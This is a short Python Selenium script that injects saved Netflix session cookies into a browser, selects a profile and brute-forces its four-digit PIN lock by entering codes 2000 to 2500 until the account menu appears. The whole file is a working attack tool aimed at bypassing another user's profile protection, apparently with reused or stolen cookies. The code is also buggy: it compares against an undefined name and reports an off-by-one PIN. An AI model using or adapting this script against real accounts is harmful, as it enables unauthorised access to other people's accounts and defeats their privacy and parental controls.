import pickle
import requests
import json
from selenium import webdriver
with open('cookie.json',"r") as f:
    data = json.load(f)
json_string = json.dumps(data)


# print(json_string)
pickle.dump( data , open("cookies.pkl","wb"))
browser = webdriver.Chrome('chromedriver.exe')

browser.get('https://www.netflix.com/login')
# print(browser.get_cookies())

print("login or use cookies")
cookie_use=input("press y to use cookies")
if(cookie_use==y):
    browser.delete_all_cookies()
    cookies = pickle.load(open("cookies.pkl", "rb"))
    for cookie in cookies:
        if 'sameSite' in cookie:
            del cookie['sameSite']
        browser.add_cookie(cookie)

# print(browser.get_cookies())
profile_names=[]
browser.get('https://www.netflix.com/browse')
profiles=browser.find_elements_by_class_name('profile-name')
# print(profiles)
for profile in profiles:
    profile_names.append(profile.get_attribute("innerHTML"))
# print(profile_names)
isPresent = len(browser.find_elements_by_class_name('account-dropdown-button')) > 0
print(isPresent)
profiles[2].click()
inputs=browser.find_elements_by_class_name('pin-number-input')
brutetest=2000

print("Bruteforce starts now:")
print("The last few numbers will be the PIN")
while(not isPresent):
    z=str(brutetest).zfill(4)
    inputs[0].send_keys(z[0])
    inputs[1].send_keys(z[1])
    inputs[2].send_keys(z[2])
    inputs[3].send_keys(z[3])
    isPresent = len(browser.find_elements_by_class_name('account-dropdown-button')) > 0
    brutetest+=1
    print(z[0],end="")
    print(z[1],end="")
    print(z[2],end="")
    print(z[3])
    if(brutetest>2500):
        break
    # print(z)
print('PIN is:')
print(brutetest)


    



# pickle.dump( browser.get_cookies() , open("cookiestest.json","wb"))